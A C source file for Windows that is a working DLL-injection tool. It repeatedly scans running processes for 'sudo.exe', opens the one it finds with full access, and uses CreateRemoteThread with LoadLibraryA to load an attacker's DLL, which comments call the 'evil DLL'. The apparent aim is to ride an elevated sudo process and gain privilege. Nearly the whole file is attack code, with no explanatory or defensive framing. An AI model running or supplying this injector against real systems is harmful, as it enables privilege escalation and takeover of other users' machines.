#include <Windows.h>
#include <psapi.h>
#include <stdio.h>

static HANDLE inject_dll(HANDLE processHandle, char dllName[]);
static HANDLE find_sudo_target();

char defaultPayload[] = "C:\\sudo-dll-payload.dll";

int main(int argc, char **argv) {
	char* payload;
	if (argc >= 2) {
		payload = argv[1];
	}
	else {
		payload = defaultPayload;
	}

	HANDLE target_handle = NULL;
	while (target_handle == NULL) {
		target_handle = find_sudo_target();
		Sleep(200);
	}
	inject_dll(target_handle, payload);
}

static HANDLE inject_dll(HANDLE proccessHandle, char dllName[]) {
	HMODULE hKernel32 = GetModuleHandle("Kernel32");
	if (hKernel32 == NULL) {
		return NULL;
	}
	VOID* lb = GetProcAddress(hKernel32, "LoadLibraryA");

	// allocate memory buffer for remote process
	void *rb = VirtualAllocEx(proccessHandle, NULL, sizeof(dllName), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (rb == NULL) {
		return NULL;
	}

	// "copy" evil DLL between processes
	WriteProcessMemory(proccessHandle, rb, dllName, sizeof(dllName), NULL);

	// our process start new thread
	HANDLE rt = CreateRemoteThread(proccessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
	CloseHandle(proccessHandle);

	return rt;
}


static HANDLE find_sudo_target()
{ 
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int i;

	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
	{
		return NULL;
	}


	// Calculate how many process identifiers were returned.

	cProcesses = cbNeeded / sizeof(DWORD);

	// Print the name and process identifier for each process.

	for (i = 0; i < cProcesses; i++)
	{
		if (aProcesses[i] != 0)
		{
			HANDLE proccesHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, aProcesses[i]);
			if (NULL != proccesHandle)
			{
				HMODULE hMod;
				DWORD cbNeeded;

				if (EnumProcessModules(proccesHandle, &hMod, sizeof(hMod),
					&cbNeeded))
				{
					char szProcessName[MAX_PATH] = "<unknown>";
					GetModuleBaseName(proccesHandle, hMod, szProcessName,
						MAX_PATH);
					if (strcmp(szProcessName, "sudo.exe") == 0) {
						printf("Found sudo proccess %i\n", aProcesses[i]);
						return proccesHandle;
					}
				}
			}
		}
	}
	return NULL;
}
